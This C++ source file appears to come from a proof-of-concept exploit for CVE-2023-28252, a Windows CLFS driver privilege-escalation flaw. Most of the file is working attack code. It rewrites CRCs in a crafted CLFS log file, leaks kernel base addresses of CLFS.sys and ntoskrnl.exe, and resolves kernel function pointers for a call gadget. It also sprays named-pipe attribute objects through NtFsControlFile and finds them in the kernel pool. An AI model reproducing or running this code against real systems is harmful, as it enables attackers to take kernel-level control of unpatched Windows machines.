/*
 * @Date: 2026-11-09 08:46:23
 * @LastEditors: joe1sn joe1sn23333@gmail.com
 * @LastEditTime: 2026-11-11 19:08:49
 * @FilePath: \CVE_2023_28252\exp\CVE_2023_28252\def.cpp
 */
#include "def.hpp"
#include <string>
#include <Windows.h>
#include <random>
#include <string>
#include <random>
#include <string>
#include <sstream>
#include <iomanip>
namespace CVE_2023_28252
{
    static std::mt19937_64& GetRandomEngine()
    {
        thread_local std::mt19937_64 engine{ std::random_device{}() };
        return engine;
    }

    std::wstring RandomUIntWString(uint64_t min, uint64_t max,
        int precision, int base)
    {
        std::uniform_int_distribution<uint64_t> dist(min, max);
        uint64_t value = dist(GetRandomEngine());

        std::wostringstream oss;
        oss.imbue(std::locale::classic());

        if (base == 16) oss << std::hex << std::uppercase;
        else if (base == 8)  oss << std::oct;

        if (precision > 0)
            oss << std::setw(precision) << std::setfill(L'0');

        oss << value;
        return oss.str();
    }


    int crcCalculatorAndFix(char* mybuf, int mysize) {


        uint32_t table[256];
        crc32::generate_table(table);

        // Struct, for piece-by-piece, bytewise
        struct DataStruct {
            uint16_t data1;
            uint16_t data2;
            float mypi;
            uint32_t myclock;
            bool begun;
        };



        char* ptr = (char*)mybuf;
        uint16_t slen = mysize;


        uint32_t CRC = 0;
        for (int cnt = 0; cnt < slen; cnt++) {
            CRC = crc32::update(table, CRC, ptr, 1);
            ptr++;
        }
        return CRC;
    }

    bool fixCRCFile(std::wstring filepath) {
        /*
        +0x0000 Control Block
        +0x0400 Control Block Shadow
        +0x0800 Base Block
        +0x8200 Base Block Shadow
        +0xFC00 Truncate Block
        +0xFE00 Truncate Block Shadow
        */

        DWORD numread = 0;
        char* ctrlBlock = new char[NormalBlockSize];
        char* ctrlBlockShadow = new char[NormalBlockSize];
        char* baseBlock = new char[BaseBlockSize];
        char* baseBlockShadow = new char[BaseBlockSize];

        HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            return false;
        }

        //--------------------------------------------------------------------

        SetFilePointer(hFile, 0x0, NULL, FILE_BEGIN);
        ReadFile(hFile, ctrlBlock, NormalBlockSize, &numread, NULL);
        *((DWORD*)(ctrlBlock + 0xc)) = 0;
        uint32_t CRC = crcCalculatorAndFix(ctrlBlock, NormalBlockSize);

        //--------------------------------------------------------------------

        SetFilePointer(hFile, 0x400, NULL, FILE_BEGIN);
        ReadFile(hFile, ctrlBlockShadow, NormalBlockSize, &numread, NULL);
        *((DWORD*)(ctrlBlockShadow + 0xc)) = 0;

        if (numread != NormalBlockSize)
        {
            printf("ERROR2\n");
            CloseHandle(hFile);
            return false;
        }

        uint32_t CRC1 = crcCalculatorAndFix(ctrlBlockShadow, NormalBlockSize);

        //--------------------------------------------------------------------

        SetFilePointer(hFile, 0x800, NULL, FILE_BEGIN);
        ReadFile(hFile, baseBlock, BaseBlockSize, &numread, NULL);
        *((DWORD*)(baseBlock + 0xc)) = 0;

        if (numread != BaseBlockSize)
        {
            printf("ERROR3\n");
            CloseHandle(hFile);
            return false;
        }

        uint32_t CRC2 = crcCalculatorAndFix(baseBlock, BaseBlockSize);

        //--------------------------------------------------------------------

        SetFilePointer(hFile, 0x8200, NULL, FILE_BEGIN);
        ReadFile(hFile, baseBlockShadow, BaseBlockSize, &numread, NULL);
        *((DWORD*)(baseBlockShadow + 0xc)) = 0;

        if (numread != BaseBlockSize)
        {
            printf("ERROR4\n");
            CloseHandle(hFile);
            return false;
        }

        uint32_t CRC3 = crcCalculatorAndFix(baseBlockShadow, BaseBlockSize);

        SetFilePointer(hFile, 0xc, NULL, FILE_BEGIN);
        WriteFile(hFile, &CRC, 4, &numread, NULL);
        SetFilePointer(hFile, 0x40c, NULL, FILE_BEGIN);
        WriteFile(hFile, &CRC1, 4, &numread, NULL);
        SetFilePointer(hFile, 0x80c, NULL, FILE_BEGIN);
        WriteFile(hFile, &CRC2, 4, &numread, NULL);
        SetFilePointer(hFile, 0x820c, NULL, FILE_BEGIN);
        WriteFile(hFile, &CRC3, 4, &numread, NULL);

        CloseHandle(hFile);

        delete[] ctrlBlock;
        delete[] ctrlBlockShadow;
        delete[] baseBlock;
        delete[] baseBlockShadow;
        return true;
    }

    void getVirtualFunction() {

        auto kClfsBase = exploit::memtools::ulGetKernelBase((PCHAR)"CLFS.SYS");
        if (!kClfsBase) {
            std::cout << "[x] Can't leak CLFS.sys kernel base address, exit\n";
            exit(1);
        }
        printf("[+] CLFS.sys Kernel Base: 0x%p\n", kClfsBase);

        auto kNtBase = exploit::memtools::ulGetKernelBase((PCHAR)"ntoskrnl.exe");
        if (!kNtBase) {
            std::cout << "[x] Can't leak ntoskrnl.exe kernel base address, exit\n";
            exit(1);
        }
        printf("[+] ntoskrnl.exe Kernel Base: 0x%p\n", kNtBase);

        HMODULE CLFS_userBase = LoadLibraryExW(L"C:\\Windows\\System32\\drivers\\CLFS.SYS", 0, 1);
        if (!CLFS_userBase)
        {
            std::cout << "[x] Can't loadlibrary CLFS.sys, exit\n";
            exit(1);
        }
        auto user_ClfsEarlierLsn = GetProcAddress(CLFS_userBase, "ClfsEarlierLsn");
        auto user_ClfsMgmtDeregisterManagedClient = GetProcAddress(CLFS_userBase, "ClfsMgmtDeregisterManagedClient");

        auto offset_ClfsEarlier = (UINT64)user_ClfsEarlierLsn - (UINT64)CLFS_userBase;
        auto offset_ClfsMgmtDeregisterManagedClient = (UINT64)user_ClfsMgmtDeregisterManagedClient - (UINT64)CLFS_userBase;

        fnClfsEarlierLsn = kClfsBase + offset_ClfsEarlier;
        fnClfsMgmtDeregisterManagedClient = kClfsBase + offset_ClfsMgmtDeregisterManagedClient;
        printf("[+] ClfsEarlierLsn Kernel Base: 0x%p\n", fnClfsEarlierLsn);
        printf("[+] ClfsMgmtDeregisterManagedClient Kernel Base: 0x%p\n", fnClfsMgmtDeregisterManagedClient);

        HMODULE ntos_userBase = LoadLibraryExW(L"ntoskrnl.exe", 0, 1);
        if (!ntos_userBase)
        {
            std::cout << "[x] Can't loadlibrary ntoskrnl.exe, exit\n";
            exit(1);
        }

        auto user_PoFxProcessorNotification = GetProcAddress(ntos_userBase, "PoFxProcessorNotification");
        auto user_SeSetAccessStateGenericMapping = GetProcAddress(ntos_userBase, "SeSetAccessStateGenericMapping");
        auto offset_PoFxProcessorNotification = (UINT64)user_PoFxProcessorNotification - (UINT64)ntos_userBase;
        auto offset_SeSetAccessStateGenericMapping = (UINT64)user_SeSetAccessStateGenericMapping - (UINT64)ntos_userBase;

        fnSeSetAccessStateGenericMapping = kNtBase + offset_SeSetAccessStateGenericMapping;
        fnPoFxProcessorNotification = kNtBase + offset_PoFxProcessorNotification;
        printf("[+] fnSeSetAccessStateGenericMapping Kernel Base: 0x%p\n", fnSeSetAccessStateGenericMapping);
        printf("[+] fnPoFxProcessorNotification Kernel Base: 0x%p\n", fnPoFxProcessorNotification);
    }


    void getVirtualAddress() {
        std::cout << "\nVIRTUAL ADDRESSES AND OFFSETS\n";

        HMODULE ntbase = LoadLibraryA("ntdll.dll");
        if (!ntbase) {
            std::cerr << "[!] LoadLibrary failed with error " << std::hex << GetLastError() << "\n";
            exit(1);
        }

        fnNtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntbase, "NtQuerySystemInformation");
        NtFsControlFile = (PNtFsControlFile)GetProcAddress(ntbase, "NtFsControlFile");
        if (!fnNtQuerySystemInformation || !NtFsControlFile) exit(1);

        std::cout << "[+] NtFsControlFile Address --> " << (void*)NtFsControlFile << "\n";

        // 1. 创建管道
        if (!CreatePipe(&g_VictimPipes.r, &g_VictimPipes.w, 0, 0x1000)) {
            exit(0);
        }

        // 2. 准备写入管道的数据
        // 使用 new 分配 UINT64 数组，长度为 0x2000 / 8，且不抛异常
        auto temp_chunk = new (std::nothrow) UINT64[0x2000 / sizeof(UINT64)];
        if (temp_chunk == nullptr) { exit(0); }

        // 初始化为 0
        memset(temp_chunk, 0, 0x2000);
        memset((UINT64*)temp_chunk + 1, 0x41, 0xffe);
        *(UINT64*)temp_chunk = 0x5a; // 首字节 0x5a ('Z')

        // 使用 new 分配 BYTE 数组（局部变量，用完即毁）
        BYTE* dest = new (std::nothrow) BYTE[0x100];
        if (dest == nullptr) { exit(0); }
        memset(dest, 0x42, 0xff);

        // 3. 触发内核分配 NpAt 对象
        IO_STATUS_BLOCK status_block = { 0 };
        NtFsControlFile(g_VictimPipes.w, 0, 0, 0, &status_block, 0x11003c, temp_chunk, 0xfd8, dest, 0x100);

        // dest 仅仅是作为 NtFsControlFile 的输出缓冲区，用完即可释放
        delete[] dest;
        dest = nullptr;

        // =========================================================
        // 4. 体面的核心：直接调用封装好的函数进行检索
        // =========================================================
        std::vector<UINT64> foundAddrs(0x100, 0);
        size_t count = exploit::memtools::ulFindKernelPoolAddress('tApN', 0, foundAddrs.data(), 0x100);

        if (count > 0) {
            para_PipeAttributeobjInkernel = foundAddrs[0];
            std::cout << "[+] pool NpAt VirtualAddress --> " << (void*)para_PipeAttributeobjInkernel << "\n";
        }
        else {
            std::cerr << "[!] Failed to find NpAt pool address.\n";
            exit(1);
        }
    }
} // namespace CVE_2023_28252